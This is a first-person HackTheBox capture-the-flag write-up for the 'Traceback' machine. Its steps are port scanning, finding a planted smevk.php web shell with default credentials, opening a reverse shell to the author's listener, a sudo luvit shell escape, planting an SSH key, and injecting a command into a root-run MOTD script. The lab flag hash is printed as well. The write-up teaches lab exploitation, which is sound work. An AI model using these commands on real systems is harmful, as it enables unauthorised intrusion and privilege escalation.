# Traceback | HackTheBox

### 1. Scan
```bash
kali@kali:~$ sudo nmap -sS -A -T4 -p- -oN nmap_default.txt 10.10.10.181
[sudo] password for kali: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-18 03:44 EDT
Nmap scan report for 10-10-10-181.tpgi.com.au (10.10.10.181)
Host is up (0.29s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.16 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Android 4.1.1 (93%), Linux 3.18 (93%), Android 4.2.2 (Linux 3.4) (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   339.44 ms 10.10.14.1
2   339.22 ms 10-10-10-181.tpgi.com.au (10.10.10.181)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 832.33 seconds
```
The target has SSH and an Apache server running.


### 2. Look at webpage
Just a single page. Viewing the source we can see a comment:
```html
</head>
<body>
	<center>
		<h1>This site has been owned</h1>
		<h2>I have left a backdoor for all the net. FREE INTERNETZZZ</h2>
		<h3> - Xh4H - </h3>
		<!--Some of the best web shells that you might need ;)-->
	</center>
</body>
</html>
```

### 3. Find the webshell
The comment seemed strange, so I googled it and found a Github repo with a listing of webshells. From this I constructed a small list to scan the site with (see scan.py). 
```bash
kali@kali:~/Desktop/htb/traceroute$ python3 scan.py 
smevk.php is present
```
The scan found one of the webshells: https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php.
And when reading the code for it, it has a default username and password (admin:admin), which had not been changed.

### 4. Pop a shell from the webshell interface
The webshell is pretty nice, it has a way to directly initiate a reverse shell, just supplying the IP and port.
```
webadmin   4140  0.0  0.1  22164  5692 ?        S    01:28   0:00 /usr/bin/perl /tmp/bc.pl 10.10.14.77 9999
```

From this we get a shell through nc.
```bash
kali@kali:~/Desktop/htb/traceroute$ nc -lp 9999
/bin/sh: 0: can't access tty; job control turned off
$ webadmin
$ whoami
webadmin
```

### 5. Enumerate webadmin
```bash
$ cd /home/webadmin
$ ls
note.txt
$ cat note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.

$ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
 
$ sudo -u sysadmin /home/sysadmin/luvit
Welcome to the Luvit repl!
> Uncaught exception:
[string "bundle:deps/readline.lua"]:485: attempt to call method 'set_mode' (a nil value)
stack traceback:
        [string "bundle:deps/readline.lua"]:485: in function 'readLine'
        [string "bundle:deps/repl.lua"]:198: in function 'start'
        [string "bundle:main.lua"]:137: in function 'main'
        [string "bundle:init.lua"]:49: in function <[string "bundle:init.lua"]:47>
        [C]: in function 'xpcall'
        [string "bundle:init.lua"]:47: in function 'fn'
        [string "bundle:deps/require.lua"]:310: in function <[string "bundle:deps/require.lua"]:266>
```
At this point I knew I had a way to execute code, just needed to do some research into how it worked. Turns out I can run code from a file as the other user using luvit.

### 6. Elevate privileges
```bash
$ echo 'os.execute("/bin/sh")' > privesc.lua
$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua
sh: turning off NDELAY mode

id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
cd ~/; ls
luvit
user.txt
cat user.txt
```

### 7. Enumerate more
```bash
$ ps -aux
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
sysadmin   2153  0.0  0.0   4628  1772 pts/0    Ss   02:38   0:00 -sh
root       2311  0.0  0.0      0     0 ?        I    02:39   0:00 [kworker/0:0]
root       2763  0.0  0.0      0     0 ?        I    02:45   0:00 [kworker/1:0]
root       4080  0.0  0.0      0     0 ?        I    02:50   0:00 [kworker/u256:1]
root       5422  0.0  0.0  58792  3108 ?        S    02:52   0:00 /usr/sbin/CRON -f
root       5424  0.0  0.0   4628   784 ?        Ss   02:52   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
root       5426  0.0  0.0   7468   780 ?        S    02:52   0:00 sleep 30
sysadmin   5428  0.0  0.0  39664  3736 pts/0    R+   02:52   0:00 ps -aux
```
Here we can see a scipt running as root, which is definately something to look at closer. I started checking out both directories specified in the script.

```bash
$ cd /var/backups/.update-motd.d/
$ ls
00-header  10-help-text  50-motd-news  80-esm  91-release-upgrade
$ ls -l
total 24
-rwxr-xr-x 1 root root  981 Aug 25  2019 00-header
-rwxr-xr-x 1 root root  982 Aug 27  2019 10-help-text
-rwxr-xr-x 1 root root 4264 Aug 25  2019 50-motd-news
-rwxr-xr-x 1 root root  604 Aug 25  2019 80-esm
-rwxr-xr-x 1 root root  299 Aug 25  2019 91-release-upgrade
```
The first one was the obvious one to check, as it had a bunch of backups, however there was nothing I was allowed to modify or do anything with. I did notice they contained the scripts that get run to create the MOTD banner. Here is the header:
```bash
$ cat 00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release
echo "\nWelcome to Xh4H land \n"
```

Checking out the other directory, the permissions here are different. I can modify the header and add my own code in to run as root.
```bash
$ cd /etc/update-motd.d/
$ ls -la
total 32
drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .
drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
-rwxrwxr-x  1 root sysadmin  981 Jun 18 02:55 00-header
-rwxrwxr-x  1 root sysadmin  982 Jun 18 02:55 10-help-text
-rwxrwxr-x  1 root sysadmin 4264 Jun 18 02:55 50-motd-news
-rwxrwxr-x  1 root sysadmin  604 Jun 18 02:55 80-esm
-rwxrwxr-x  1 root sysadmin  299 Jun 18 02:55 91-release-upgrade
```
Note the perms.

### 8. Escalate privileges
The script runs whenever the motd needs to be displayed, so basically whenever someone logs into the system. But because it gets reset every 30 seconds, I can't wait for someone else to log in. I created a new SSH key on my machine then copied it into the authorized_keys file.

```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCk9u1bT7SI4uaA4Ycgxc2r1Mtkyl/jmBakqjmEovJvgPVjUaaetLUeUwykCcp8wpOe9OEEzTzuPjwNL83AvkjQeJge2C+wrgPlUmZAZZzGQfFyzUGQygxLr/iEmmu5xO9sGcCnbwsJX1kM2TN6WnwVtDJI/A33wDWxbNCYLIdmYkJgtVBOL5cK0O1J+bioUUAzAjJcQ5qETEIf3nn5MFdDWGGEMR1LUgD6TJjsWIxg+yh3J8KimS+SfOUKhNHpOBb/y6kSWeQyVOUPtqhL2ezhMzqe8c1DIZS3fJAnkeVcTr9u7KJm/xnr5pyk7smZMYtFXSqPMQOHZ6dNDwkTihq3SnTYtRt4YHiKEIPpWzGT7ux4gat1AXzD1n6bIPskgpb6KGMVemA6X0/FCVcAZ90qeRPhM9da+JzI6WkadzFLyG4hlJi/YzhfDxg5OxyIb6zuvxs8mf7AlE0yJdpI+LjsN0zh6YTtNT35R1icX3yi3RRZyN+WHTwrqBDZhjCYwA0= kali@kali" > authorized_keys
```

Then, on the server:
```bash
$ echo "cat /root/root.txt" >> 00-header
cat 00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release


echo "\nWelcome to Xh4H land \n"
cat /root/root.txt
```

On my system (within 30 seconds):
```bash

#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 

65ce9b7ff099ae27302766d02bb9d0d3


Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Jun 18 02:38:38 2020 from 10.10.14.77
```
